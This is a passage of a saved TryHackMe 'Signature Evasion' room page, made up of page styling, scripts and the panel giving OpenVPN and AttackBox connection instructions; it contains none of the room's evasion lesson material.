
    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq hidden-originally" id="navConnModal" tabindex="-1" role="dialog" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-slideout hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="slideout-bk" class="noselect hidden-originally" onclick="showSlideoutConnOptions()" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="far fa-arrow-left mr-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Show Connection Options</div>
<div id="slideout-conn-options" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div id="slideout-conn-header" class="text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<img class="slideout-connect-img hidden-originally" src="./TryHackMe _ Signature Evasion_files/tryhackme_connect.png" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="slideout-conn-status" class="size-22 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">You are <span class="text-danger hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">disconnected</span></div>
</div>
<div class="m-3 text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-md-12 mb-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="clear-link preventDefault hidden-originally" href="https://tryhackme.com/room/signatureevasion#" onclick="showAttackBoxSteps()" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="card card-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="row vertical-align-custom hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col col-2 text-center faq-quicklinks-icons hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="far fa-laptop hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div class="col hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="faq-quicklinks-title size-18 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">AttackBox</div>
<p class="faded mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="clear-link preventDefault hidden-originally" href="https://tryhackme.com/room/signatureevasion#" onclick="showVPNSteps()" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="card card-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="row vertical-align-custom hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col col-2 text-center faq-quicklinks-icons hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="far fa-key hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div class="col hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="faq-quicklinks-title size-18 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">OpenVPN</div>
<p class="faded mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="nav-openvpn" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="mb-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a target="_blank" href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h4 data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center hidden-originally" id="vpn-guide" style="display: flex; justify-content: center;" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li class="nav-item m-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="pill" href="https://tryhackme.com/room/signatureevasion#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fab fa-windows mr-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Windows</a>
</li>
<li class="nav-item m-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link active hidden-originally" data-toggle="pill" href="https://tryhackme.com/room/signatureevasion#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fab fa-linux mr-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Linux</a>
</li>
<li class="nav-item m-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="pill" href="https://tryhackme.com/room/signatureevasion#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fab fa-apple mr-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="tab-pane fade hidden-originally" id="pills-windows" role="tabpanel" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ol data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><a href="https://tryhackme.com/vpn/get-config" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Open and run the OpenVPN GUI application as Administrator.<br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Signature Evasion_files/win_ran_admin.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Import File</b>. <br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Signature Evasion_files/win_import.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Select the configuration file you downloaded earlier.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Now right click on the application again, select your file and click Connect <br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Signature Evasion_files/win_connect.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
</ol>
</div>
<div class="tab-pane fade show active hidden-originally" id="pills-linux" role="tabpanel" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ol data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><a href="https://tryhackme.com/vpn/get-config" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Run the following command in your terminal: <code class="dark hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">sudo apt install openvpn</code></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use your OpenVPN file with the following command: <code class="dark hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade hidden-originally" id="pills-macos" role="tabpanel" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ol data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><a href="https://tryhackme.com/vpn/get-config" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img width="250" class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Signature Evasion_files/mac_installer.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Open and run the OpenVPN GUI application.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">The application will start running and appear in your top bar. Right click on the application and click <b data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Import File -&gt; Local file</b>.<br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Signature Evasion_files/mac_import.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Select the configuration file you downloaded earlier.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Right click on the application again, select your file and click connect.<br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Signature Evasion_files/mac_connect.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
</ol>
</div>
</div>
<section class="text-left hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="remove-underline hidden-originally" data-toggle="collapse" href="https://tryhackme.com/room/signatureevasion#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="mb-0 text-openvpn hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Having Problems?</h5>
</a>
<div class="collapse hidden-originally" id="havingProblems" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ul class="mt-2 mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">If you can access <a target="_blank" href="http://10.10.10.10/" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">10.10.10.10</a>, you're connected.</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Downloading and getting a 404? Go the <a href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">access</a> page and switch VPN servers.</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Getting inline cert error? Go the <a href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">access</a> page and switch VPN servers.</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Is the OpenVPN client running as root? <span class="size-14 faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Have you restarted your VM?</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Is your OpenVPN up-to-date?</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Only 1 OpenVPN connection is allowed. <span class="size-14 faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">(Run <code class="dark hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h4 data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">AttackBox</h4>
<p class="faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">To start your AttackBox in the room, click the <a class="preventDefault hidden-originally" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/signatureevasion#" data-pf_style_display="none" data-pf_style_visibility="hidden">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Free users get 1 free AttackBox hour. <a class="hacker-green hidden-originally" href="https://tryhackme.com/why-subscribe" data-pf_style_display="none" data-pf_style_visibility="hidden">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Hide IP</span>
</div>
</div>
</div>
</div>
<script data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div><iframe id="_hjSafeContext_39970481" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Signature Evasion_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;" data-pf_style_display="none" data-pf_style_visibility="visible" data-pf_rect_width="0" data-pf_rect_height="0" class="hidden-originally"></iframe>
<script src="./TryHackMe _ Signature Evasion_files/notify.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/api-requests.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/events.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/underscore-min.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/apexcharts.min.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script> 
<script src="./TryHackMe _ Signature Evasion_files/chart.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/expire.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/sockets.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/faqSearch.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/certificate.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/utils.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/roomSpecific.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/confetti.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/videos.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/intro.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/prism.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/asciinema-player.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/magnific-popup.min.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/introjsLogic.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/logic.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/tasks.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/connection-status.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/glossary.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/room-mymachine.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Signature Evasion_files/heartbeat.js" defer="" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "gOYFwUPz-iq0yYuNxK_Jai3N8dIOciymqEmg"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "signatureevasion"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: true,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;" data-pf_style_display="block" data-pf_style_visibility="visible" data-pf_rect_width="2" data-pf_rect_height="0"><defs id="SvgjsDefs1002" data-pf_style_display="inline" data-pf_style_visibility="visible"></defs><polyline id="SvgjsPolyline1003" points="0,0" data-pf_style_display="inline" data-pf_style_visibility="visible"></polyline><path id="SvgjsPath1004" d="M0 0 " data-pf_style_display="inline" data-pf_style_visibility="visible"></path></svg><div id="A90D0676-477B-D4F8-B027-D554BB53295E" data-pf_style_display="block" data-pf_style_visibility="visible"></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" data-pf_style_display="block" data-pf_style_visibility="visible" data-pf_rect_width="1" data-pf_rect_height="1" src="./TryHackMe _ Signature Evasion_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open" data-pf_style_display="flex" data-pf_style_visibility="visible"><img src="./TryHackMe _ Signature Evasion_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open" data-pf_style_display="block" data-pf_style_visibility="visible" data-pf_rect_width="24" data-pf_rect_height="24"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize" data-pf_style_display="flex" data-pf_style_visibility="visible"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-pf_style_display="block" data-pf_style_visibility="visible" data-pf_rect_width="0" data-pf_rect_height="0">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white" data-pf_style_display="inline" data-pf_style_visibility="visible"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>